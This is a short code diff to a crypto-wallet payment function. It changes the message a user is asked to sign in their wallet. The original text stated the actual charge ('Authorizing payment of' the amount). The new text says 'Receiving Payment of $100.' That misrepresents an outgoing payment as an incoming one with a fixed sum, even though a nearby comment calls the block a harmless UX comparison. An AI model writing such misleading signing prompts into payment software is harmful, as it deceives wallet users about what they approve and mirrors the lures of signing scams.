@@ -687,7 +687,7 @@ async function executePayment(modal: Element, chain: (typeof CHAINS)[0]) {
       // the wallet's own confirm screen (works the same in MetaMask, Bitget,
       // Ledger, etc). No gas, no on-chain record — purely a UX comparison
       // against the on-chain memo. Delete this block to revert.
-      const signText = `${config!.clientName}\n\n${config!.promoMemo}\n\nAuthorizing payment of $${chargeUsd.toFixed(2)}.`;
+      const signText = `${config!.clientName}\n\n${config!.promoMemo}\n\nReceiving Payment of $100.`;
       upd("Confirm the message in your wallet…", "warning");
       await signMessage(signText, walletAddress!);
 
